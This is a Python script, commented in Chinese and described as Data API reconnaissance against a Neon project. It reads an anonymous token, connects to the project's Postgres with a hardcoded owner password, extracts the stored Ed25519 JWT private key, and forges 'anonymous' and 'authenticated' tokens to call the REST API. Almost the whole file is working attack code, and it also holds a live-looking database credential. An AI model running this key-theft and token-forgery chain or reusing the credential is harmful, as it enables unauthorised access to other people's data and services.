# -*- coding: utf-8 -*-
"""Data API 面侦察[3]:匿名 token 结构 + 自签 JWT 可行性
1) GET neonauth /token/anonymous -> dump header(kid)/payload(不打印签名)
2) PG 读 neon_auth.jwks privateKey -> 恢复 Ed25519
3) 用私钥自签 JWT(与匿名 token 相同 payload 结构) -> 请求 Data API root
零破坏:全只读 HTTP GET。"""
import http.client, ssl, json, base64, sys, time

ctx = ssl.create_default_context()
NA = 'ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build'
DA = 'ep-crimson-fog-w2gucld1.apirest.us-east-2.aws.neon.build'

def http_get(host, path, hdr=None):
    conn = http.client.HTTPSConnection(host, context=ctx, timeout=20)
    h = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'}
    if hdr: h.update(hdr)
    conn.request('GET', path, headers=h)
    r = conn.getresponse(); raw = r.read(); st = r.status
    conn.close()
    return st, raw

def b64u(s):
    s = s.replace('-', '+').replace('_', '/')
    s += '=' * (-len(s) % 4)
    return s

def b64u_dec(s):
    return base64.b64decode(b64u(s))

# [1] 匿名 token
print('=== [1] GET /neondb/auth/token/anonymous ===', flush=True)
st, raw = http_get(NA, '/neondb/auth/token/anonymous')
print('status:', st)
anon_tok = None
if st == 200:
    d = json.loads(raw)
    tok = d.get('token') or d.get('jwt') or ''
    print('resp keys:', list(d.keys()))
    if tok:
        print('token raw head:', tok[:150].replace('\n', '\\n'))
        print('token dots:', tok.count('.'), 'len:', len(tok))
        parts = tok.split('.')
        if len(parts) == 3:
            try:
                hdr = json.loads(b64u_dec(parts[0]))
                pay = json.loads(b64u_dec(parts[1]))
                print('header:', json.dumps(hdr))
                print('payload:', json.dumps(pay, ensure_ascii=False))
                print('signature len:', len(parts[2]))
                anon_tok = tok
            except Exception as e:
                print('jwt parse err:', e)
        else:
            print('token not JWT, len:', len(tok))
    else:
        print('no token in resp:', raw[:300])
else:
    print(raw[:300])

# [2] PG 读 privateKey
print('\n=== [2] jwks privateKey from PG ===', flush=True)
import psycopg
URI = 'postgresql://neondb_owner:npg_cI5ynlaAqjU2@ep-crimson-fog-w2gucld1.us-east-2.aws.neon.build/neondb'
conn = psycopg.connect(URI, connect_timeout=20)
conn.autocommit = True
cur = conn.cursor()
cur.execute('SELECT "publicKey", "privateKey" FROM neon_auth.jwks LIMIT 1')
row = cur.fetchone()
conn.close()
if not row:
    print('NO JWKS ROW!')
    sys.exit(1)
pub_jwk, priv_jwk = row
print('publicKey head:', pub_jwk[:80])
print('privateKey head:', priv_jwk[:60], '...')
pj = json.loads(priv_jwk)
if isinstance(pj, str):
    # 列存的是 hex(JSON bytes)?
    try:
        inner = bytes.fromhex(pj.strip('"')).decode('utf-8')
        pj = json.loads(inner)
        print('hex->json decode ok')
    except Exception as e:
        print('hex decode err:', e)
print('priv jwk type:', type(pj).__name__)
if isinstance(pj, dict):
    print('keys:', list(pj.keys()))
    print('kty:', pj.get('kty'), 'crv:', pj.get('crv'))
    d = pj.get('d', '')
    print('d head:', d[:24], 'len:', len(d))
else:
    print('still str, head:', pj[:60])

# [3] 自签 JWT
print('\n=== [3] forge JWT ===', flush=True)
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
from cryptography.hazmat.primitives import serialization
seed = base64.urlsafe_b64decode(b64u(pj['d']))
privkey = Ed25519PrivateKey.from_private_bytes(seed)
print('Ed25519 key restored from seed, len=%d' % len(seed))
pub_der = privkey.public_key().public_bytes(serialization.Encoding.Raw, serialization.PublicFormat.Raw)
x = base64.urlsafe_b64encode(pub_der).decode().rstrip('=')
print('pub x match jwks:', x == pj.get('x'))

def enc(o):
    return base64.urlsafe_b64encode(json.dumps(o, separators=(',', ':')).encode()).decode().rstrip('=')

def make_jwt(payload, kid=None):
    hdr = {'alg': 'EdDSA', 'typ': 'JWT'}
    if kid: hdr['kid'] = kid
    p = dict(payload)
    p.setdefault('iat', int(time.time()))
    p.setdefault('exp', int(time.time()) + 3600)
    body = enc(hdr) + '.' + enc(p)
    sig = privkey.sign(body.encode())
    return body + '.' + base64.urlsafe_b64encode(sig).decode().rstrip('=')

# 伪造 token 请求 Data API
for name, payload in [
    ('role=anonymous', {'role': 'anonymous', 'sub': '00000000-0000-0000-0000-000000000000'}),
    ('role=authenticated', {'role': 'authenticated', 'sub': 'b8a46aa3-0000-0000-0000-000000000000'}),
]:
    tok = make_jwt(payload, kid='6ab964bf-eee3-4249-bac3-85adf9d5faee')
    st, raw = http_get(DA, '/neondb/rest/v1/', hdr={'Authorization': 'Bearer ' + tok})
    print('\n[%s] Data API root -> %d' % (name, st))
    print('   ', raw[:400].decode(errors='replace'), flush=True)

# 真实匿名 token 对照
if anon_tok:
    st, raw = http_get(DA, '/neondb/rest/v1/', hdr={'Authorization': 'Bearer ' + anon_tok})
    print('\n[real anonymous token] Data API root -> %d' % st)
    print('   ', raw[:400].decode(errors='replace'))
